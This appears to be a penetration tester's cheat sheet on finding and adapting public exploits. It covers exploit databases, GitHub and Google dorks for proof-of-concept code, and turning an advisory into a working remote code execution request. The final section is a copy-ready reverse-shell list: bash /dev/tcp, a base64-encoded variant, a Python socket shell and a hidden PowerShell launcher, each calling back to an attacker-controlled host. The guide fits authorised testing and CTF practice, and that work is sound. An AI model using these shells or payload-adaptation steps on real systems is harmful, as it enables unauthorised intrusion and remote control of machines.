# 📝 PENSTER'S REMINDER: From Version Identification to Exploitation (PoC to RCE)

## 1. Where to Look for Ready-Made Exploits (Databases and Aggregators)

If there's a specific software version or CVE number, check the list strictly from top to bottom.

- **Sploitus (Search engine across all databases):** `[https://sploitus.com/](https://sploitus.com/)` — searches GitHub, Exploit-DB, and Vulners simultaneously. The fastest way to get started.
- **Nuclei Templates (A Goldmine for the Web):**
- Repository: `[https://github.com/projectdiscovery/nuclei-templates/tree/main/http/cves](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/cves)`
- _Meaning:_ They contain YAML files. Each file contains a **raw HTTP request** (headers, path, payload). Just copy the request into Burp Repeater.
- **Trickest CVE Repository:** `[https://github.com/trickest/cve](https://github.com/trickest/cve)` — a constantly updated archive of PoCs from GitHub, sorted by year.
- **Exploit-DB (Offline Database):**
- Search: `searchsploit "Apache 2.4.49"`
- Copy script to folder: `searchsploit -m <EDB-ID>`
- **Vulmon / Vulners:** Platforms for finding connections between CVEs and available exploits.
## 2. Google & GitHub Dorking (When direct search yields nothing)

If search engines only return news articles, use strict filters to search for code and logs.

**GitHub Dorks (Type in GitHub search):**

```
"CVE-202X-XXXX" path:exploit.py
"CVE-202X-XXXX" "import requests"
"Service_Name Version" "proof of concept"
```

**Google Dorks:**

```
"CVE-202X-XXXX" site:github.com OR site:gitlab.com
"CVE-202X-XXXX" intext:"curl" OR intext:"POST /"
"CVE-202X-XXXX" inurl:"writeup" OR inurl:"advisory" OR inurl:"hackerone"
"Service_Name Version" "remote code execution" "python"
```

## 3. Algorithm: What to do if there is NO PoC script, there is only Article/Report

Vulnerability reports (Security Advisories, HackerOne) often don't publish .py scripts, but they do show the logic. Your task is to recreate it manually.

1. **Find the vulnerable endpoint (Route/Path):** Look for the block of code with the HTTP request in the article. What URL is it sent to? (For example: `/api/v1/upload` or `/cgi-bin/admin.cgi`).
2. **Identify the vulnerable parameter:** Where exactly is the malicious code inserted? (In the `?file=` URL parameter, in the `{"cmd": "..."}` JSON body, or in the `User-Agent:` header).
3. **Recreate the request in Burp Suite:**
- Send a legitimate request to the application in Burp Repeater.
- Replace the normal data with the payload from the article.
4. **Adapt the Payload:**
- If the article contained `whoami` or `id`, replace it with a connection ping: `ping -c 3 <YOUR_IP>` or `curl http://<YOUR_IP>/test`.
- Run the listener: `sudo tcpdump -i tun0 icmp` or `python3 -m http.server 80`.
- If a ping/request is received, RCE (Remote Code Execution) is working; you can insert Reverse Shell.
## 4. Checklist for Adapting Someone Else's PoC (Before Launching)

Never run a downloaded exploit blindly. 90% of them require manual modification for the target machine.

- **Check URL variables:** Find `RHOST`, `RPORT`, `LHOST`, `LPORT`, `TARGET_URL` in the code and replace them with your own.
- **Protocol (HTTP vs HTTPS):** Make sure the script is calling using the correct protocol. Many scripts fail due to SSL (Secure Sockets Layer) certificate errors. Add a disable certificate verification option (in Python: `verify=False`).
- **Paths and Directories:** If the application is not installed in the root directory on the server (for example, not `[http://10.10.10.10/](http://10.10.10.10/)`, but `[http://10.10.10.10/wordpress/](http://10.10.10.10/wordpress/)`), specify the base path in the script.
- **Payload Encoding:** Depending on WAF/Server filters, the command often needs to be encoded:
- URL Encoding (Required for GET parameters).
- Base64 (Often needed for PowerShell commands on Windows: `powershell -enc <BASE64>`).
- **Fake/Backdoor Check:** Skim the code. If it contains obfuscated strings (Base64) that take up half the screen and aren't sent to the target server, it's a fake that will attempt to hack your machine.

## 5. Reverse Shells: A Cheat Sheet for Substitution in Exploits

If the PoC executes commands, replace the command in the script with one of these reliable one-liners.

**Linux (Bash):**

```
bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1
```
# If bash is filtering, try Base64 encoding:
```
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=" | base64 -d | bash
```

**Linux (Python 3 - if no bash/nc):**

```
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<YOUR_IP>",<YOUR_PORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

**Windows (PowerShell - works almost always):**

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient
```
